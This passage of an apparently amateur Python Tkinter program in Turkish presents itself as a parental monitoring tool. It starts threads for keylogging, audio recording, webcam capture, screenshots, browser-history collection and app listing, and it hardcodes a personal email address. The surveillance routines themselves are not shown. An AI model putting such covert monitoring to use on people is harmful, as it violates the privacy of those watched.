    keyloggerBut.place(x=740,y=80)
    

    ayarBut=Button(window,text="Ayarlar",image=setting,bd=0,highlightthickness=0,command=Settings,width=168,height=162,bg="#ffffff",fg="#000000")
    ayarBut.place(x=80,y=350)

    mailBut=Button(window,text="Mail Görüntüleyici",image=mail,bd=0,highlightthickness=0,command=mailListBaslangic,width=168,height=162,bg="#660099",fg="#000000")
    mailBut.place(x=300,y=350)

    uygulamaBut=Button(window,text="Uygulamaları İzle",image=uyg,bd=0,highlightthickness=0,command=taskListBaslangic,width=168,height=162,bg="#ff00ff",fg="#000000")
    uygulamaBut.place(x=520,y=350)

    sesBut=Button(window,text="Ses",image=ses,bd=0,highlightthickness=0,command=soundListenerBaslangic,width=168,height=162,bg="#FFFF00",fg="#000000")
    sesBut.place(x=740,y=350)

    playBut=Button(window,image=play,bd=0,highlightthickness=0,command=izleyiciBaslat,width=85,height=81,bg="#ff00ff",fg="#000000")
    playBut.place(x=1080,y=500)

    stopBut=Button(window,image=stop,bd=0,highlightthickness=0,command=stopTheWorld,width=85,height=81,bg="#FFFF00",fg="#000000")
    stopBut.place(x=1180,y=500)


    view =Label (window,image=avatar)
    view.place(x=1080,y=80,width=169,height=169)

    hello =Label (window,text="Hoşgeldiniz ",bg="#050238",fg="#ffffff")
    hello.place(x=1180,y=300)

    mesaj =Label (window,text="\n Bu programı kullanarak siz evde yokken çocuğunuz \n bilgisayar başında neler yapıyor öğrenebilirsiniz.\n Tek yapmanız gereken ilgili buttonlara tıklamaktır.\n Çıkış için İzlemeyi Durdur",bg="#050238",fg="#ffffff")
    mesaj.place(x=1000,y=370)

    


    window.mainloop()
#</---Anamenü Fonksiyonunun Tanımlanması--->

#<---Zamanlayıcı  Fonksiyonunun Tanımlanması--->

def zamanlayiciFonk():
    x=0
    try:
        dosya=open("Settings/ayarlar.txt", "r")
        dizi=[]
        dizi=dosya.readlines()
        dosya.close()
        dosyam=open("Settings/mail.txt", "r")
        mailim=dosyam.read()
        dosyam.close()
    except:
        dizi=[]
        dizi[0]=10
        dizi[1]=10
        dizi[2]=10
        dizi[3]=10
        dizi[4]=10
        dizi[5]=10
        dizi[6]=10
        mailim="ugurilgin94@gmail.com"
        print("Burası")
    while(timebreak):
        if(x% int(dizi[4])==0):
            webCamSaver()
        if(x%int(dizi[6])==0):
            uygBul()
        #if(x%int(dizi[3])==0):
            #mailSender()
        if(x%int(dizi[1])==0):
           bulHistory()   
        if(x%int(dizi[2])==0):
            screenSaver()
            
        print(x)
        x=x+1
        time.sleep(1)


def zamanlayiciAudio():
    global timebreak
    global zamansabiti
    zamansabiti=0
    while(timebreak):
        recordAudio()
        print("Audio:"+str(zamansabiti))
        zamansabiti=zamansabiti+1
        time.sleep(1)


#</---Zamanlayıcı  Fonksiyonunun Tanımlanması--->

#<---Kontrol  Fonksiyonunun Tanımlanması--->
    
def baslangicKontrol():
    global bugun
    dosya=open("online.txt","r")
    a=dosya.read()
    if(a=="1"):
        timebreak=True
    if (a=="0"):
        timebreak=False
    dosya.close()
    return a
#MultiThreading 

#</---Kontrol  Fonksiyonunun Tanımlanması--->
#<---MultiThreading  Fonksiyonunun Tanımlanması--->

baslangicKontrol()
baslangicUygThread=threading.Thread(target=baslangicUyg)
baslangicHistoryThread=threading.Thread(target=baslangicHistory)
menuThread = threading.Thread(target=AnaMenu)


keyloggerThread = threading.Thread(target=Keyloggerim)
zamanlayiciThread = threading.Thread(target=zamanlayiciFonk)
sesKaydediciThread = threading.Thread(target=zamanlayiciAudio)
test=baslangicKontrol()
if(test=="1"):
    sesKaydediciThread.start()
    menuThread.start()
    baslangicUygThread.start()
    baslangicHistoryThread.start()
    zamanlayiciThread.start()
    keyloggerThread.start()
if(test=="0"):
    menuThread.start()
#</---MultiThreading  Fonksiyonunun Tanımlanması--->
